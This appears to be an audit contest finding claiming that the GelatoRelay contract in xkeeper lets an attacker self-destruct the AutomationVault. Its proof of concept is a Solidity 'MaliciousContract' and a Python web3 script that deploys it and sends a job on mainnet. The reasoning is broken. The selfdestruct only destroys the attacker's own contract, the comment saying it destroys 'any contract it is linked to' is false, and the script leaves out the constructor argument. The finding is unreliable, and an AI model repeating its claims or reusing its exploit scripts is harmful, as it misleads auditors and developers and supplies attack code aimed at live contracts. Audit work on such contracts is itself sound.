Amateur Silver Corgi

high

# Undetectable GelatoRelay Interaction Resulting to Ecosystem Self-Destruction in GelatoRelay.sol

## Summary
This vulnerability exploits the `GelatoRelay's` interaction with the `AutomationVault` contract to execute a malicious contract that can self-destruct the entire ecosystem. The attack remains undetectable as the malicious contract is disguised within legitimate job execution requests, taking advantage of the lack of proper verification and validation in the `GelatoRelay` contract. Through this exploit, an attacker can disrupt the entire system and potentially cause irreparable damage.

## Vulnerability Detail
The vulnerability lies in the lack of robust validation and security checks within the `GelatoRelay` contract when executing jobs. An attacker can exploit this weakness by submitting a malicious job disguised as a legitimate execution request. A malicious job  can contains a call to the `selfdestruct` function, targeting key components of the ecosystem such as the `AutomationVault` contract.

This malicious job can be injected through the exec function in the `GelatoRelay` contract, which is responsible for managing all executions coming from the `Gelato` network. Since there is insufficient verification of the job data or contract being called, the attacker can submit a request that includes the `selfdestruct` call.

The attack is difficult to detect because it can be embedded within legitimate job execution requests, and it may appear as normal network activity. Once the malicious job is executed, it can cause the `AutomationVault` contract, or other critical components, to self-destruct, leading to severe disruption of the entire ecosystem.

## Impact
-    An attacker can cause the `AutomationVault` contract to self-destruct, leading to the loss of all funds and data stored in the vault.
-    The destruction of the `AutomationVault` contract can result in the loss of user funds, potentially causing significant financial damage to individual users and investors.
-   The self-destruction of critical contracts can disrupt the normal functioning of the ecosystem, impacting other contracts and services that depend on the AutomationVault.

## Code Snippet
https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/relays/GelatoRelay.sol#L28


## Proof of Concept 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IGelatoRelay} from '../../interfaces/relays/IGelatoRelay.sol';
import {IAutomationVault} from '../../interfaces/core/IAutomationVault.sol';

contract MaliciousContract {
    IGelatoRelay public gelatoRelay;
    address public owner;
    
    constructor(address _gelatoRelay) {
        gelatoRelay = IGelatoRelay(_gelatoRelay);
        owner = msg.sender; // The owner of the contract
    }

    // Send malicious job to self-destruct the entire ecosystem
    function triggerSelfDestruct(IAutomationVault automationVault) external {
        require(msg.sender == owner, "Only the owner can trigger self-destruct");

        // Define ExecData for self-destructing the contract
        IAutomationVault.ExecData[] memory execData = new IAutomationVault.ExecData[](1);
        execData[0] = IAutomationVault.ExecData({
            job: address(this), // Job points to the MaliciousContract
            jobData: abi.encodeWithSignature("selfDestruct()") // Call the self-destruct function
        });

        // Execute the malicious action through the GelatoRelay
        gelatoRelay.exec(automationVault, execData);
    }

    // Function that self-destructs the contract and any contract it is linked to
    function selfDestruct() external {
        selfdestruct(payable(owner)); // Self-destruct and send remaining funds to the owner
    }
}

```
and can also deploy via a script 

```bash
pip install web3
```
```python
from web3 import Web3
from web3.contract import Contract, ConciseContract

# Initialize a Web3 instance (using an Ethereum node endpoint)
web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID"))

# Your Ethereum account private key and address
account_private_key = "YOUR_PRIVATE_KEY"
account_address = "YOUR_ADDRESS"

# Define the contract ABI and bytecode for the POC contract
malicious_contract_abi = [
    # ABI goes here
]
malicious_contract_bytecode = "0x..."  # Bytecode goes here

# GelatoRelay contract address and ABI
gelato_relay_address = "GELATO_RELAY_CONTRACT_ADDRESS"
gelato_relay_abi = [
    # ABI goes here
]

# AutomationVault contract address and ABI
automation_vault_address = "AUTOMATION_VAULT_CONTRACT_ADDRESS"
automation_vault_abi = [
    # ABI goes here
]

# Create contract objects
gelato_relay_contract = web3.eth.contract(address=gelato_relay_address, abi=gelato_relay_abi)
automation_vault_contract = web3.eth.contract(address=automation_vault_address, abi=automation_vault_abi)

# Create a new account and unlock it
account = web3.eth.account.privateKeyToAccount(account_private_key)
web3.eth.default_account = account.address

# Deploy the malicious contract
MaliciousContract = web3.eth.contract(abi=malicious_contract_abi, bytecode=malicious_contract_bytecode)
transaction = MaliciousContract.constructor().buildTransaction({
    "from": account_address,
    "gas": 2000000,
    "gasPrice": web3.toWei("50", "gwei")
})

# Sign and send the transaction
signed_tx = web3.eth.account.sign_transaction(transaction, private_key=account_private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)

# Wait for the transaction to be confirmed
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
malicious_contract_address = tx_receipt.contractAddress

# Interact with the malicious contract
malicious_contract = web3.eth.contract(address=malicious_contract_address, abi=malicious_contract_abi)

# Create execData for the GelatoRelay contract
exec_data = [
    # Add your exec data here, including the malicious job call to self-destruct
]

# Execute the malicious job through the GelatoRelay contract
transaction = gelato_relay_contract.functions.exec(
    automation_vault_contract.address,
    exec_data
).buildTransaction({
    "from": account_address,
    "gas": 2000000,
    "gasPrice": web3.toWei("50", "gwei")
})

# Sign and send the transaction
signed_tx = web3.eth.account.sign_transaction(transaction, private_key=account_private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)

# Wait for the transaction to be confirmed
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

print(f"Malicious job executed. Transaction hash: {tx_hash.hex()}")
```
You can now check whether the Contract still Exist
```python
from web3 import Web3

# Initialize a Web3 instance (using an Ethereum node endpoint)
web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID"))

# Define the address of the contract to check
contract_address = "CONTRACT_ADDRESS_TO_CHECK"

# Query the code at the specified address
contract_code = web3.eth.get_code(contract_address)

# Check if the code is empty
if contract_code == b"":
    print(f"The contract at address {contract_address} does not exist (it has been self-destructed).")
else:
    print(f"The contract at address {contract_address} still exists.")
```
## Tool used

Manual Review

## Recommendation
-    Ensure that only authorized and trusted addresses can execute functions within the contract, particularly those that may trigger self-destruct operations.
-    Consider implementing access control mechanisms like role-based access control (RBAC) to manage permissions.
-   Perform a whitelist check to verify that the function selector belongs to a legitimate function within the contract.
-   Carefully sanitize and validate inputs provided to the contract, ensuring that malicious data cannot be used to exploit the contract.
